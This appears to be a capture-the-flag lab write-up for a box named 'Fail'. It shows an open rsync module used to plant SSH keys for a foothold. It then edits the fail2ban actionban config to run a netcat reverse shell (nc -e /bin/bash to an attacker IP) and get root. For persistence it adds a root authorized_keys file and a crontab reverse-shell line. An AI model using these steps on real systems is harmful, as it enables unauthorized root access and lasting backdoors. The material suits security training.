# Fail
### Enumeration
Ports 22 and 873 (rsync) are open.

##### 873
I've used `>` to denote my input.
```shell-session
$ nc -nv 192.168.55.126 873
(UNKNOWN) [192.168.55.126] 873 (rsync) open
@RSYNCD: 31.0
> @RSYNCD: 31.0
> #list 
fox             fox home
@RSYNCD: EXIT

$ rsync -av --list-only rsync://192.168.55.126/fox
receiving incremental file list
drwxr-xr-x          4,096 2021/01/21 09:21:59 .
lrwxrwxrwx              9 2020/12/03 15:22:42 .bash_history -> /dev/null
-rw-r--r--            220 2019/04/18 00:12:36 .bash_logout
-rw-r--r--          3,526 2019/04/18 00:12:36 .bashrc
-rw-r--r--            807 2019/04/18 00:12:36 .profile

sent 20 bytes  received 136 bytes  312.00 bytes/sec
total size is 4,562  speedup is 29.24
```

### Foothold

It looks like rsync is to the `fox` user's home directory. We can try uploading an `.ssh` directory to get SSH access:

```shell-session
$ ssh-keygen
...

$ rsync -av ~/.ssh/ rsync://192.168.55.126/fox/.ssh
```

We get access as the `fox` user.

### Privilege Escalation

We notice that we're a member of the `fail2ban` group. If we look in `/etc/fail2ban` we see a file called `README.fox`, which says:

```
Fail2ban restarts each 1 minute, change ACTION file following Security Policies. ROOT!
```

We could also have figured this out using `pspy`, which would have shown `fail2ban` being restarted every minute.

We see the following in `/etc/fail2ban/jail.conf`:

```ini
# "bantime" is the number of seconds that a host is banned.
bantime  = 1m

# A host is banned if it has generated "maxretry" during the last "findtime"
# seconds.
findtime  = 10m

# "maxretry" is the number of failures before a host get banned.
maxretry = 2

# ...

banaction = iptables-multiport
```

So we edit `/etc/fail2ban/action.d/iptables-multiport.conf` with the following:

```ini
actionban = nc -e /bin/bash 192.168.55.200 9001
```

Then we start a netcat listener locally and trigger fail2ban by trying to connect to SSH as a random user with a random password (we have to make 2 password attempts since `maxretry = 2`). Now we have a root shell!

### Persistence
The shell dies after a minute since that's the ban duration and the fail2ban process will be killed after a minute, destroying the reverse shell.

I achieved persistence by quickly creating `/root/.ssh` and writing my public key to `/root/.ssh/authorized_keys`, allowing me to SSH in as root.

We could also have changed the fail2ban configuration to write to `/etc/crontab` as below:

```ini
actionban = echo "*  *  *  *  * root nc 192.168.55.200 9001 -e /usr/bin/bash" >> /etc/crontab
```

This would trigger a new reverse shell every minute. `cron` won't kill the process, so the reverse shell won't die!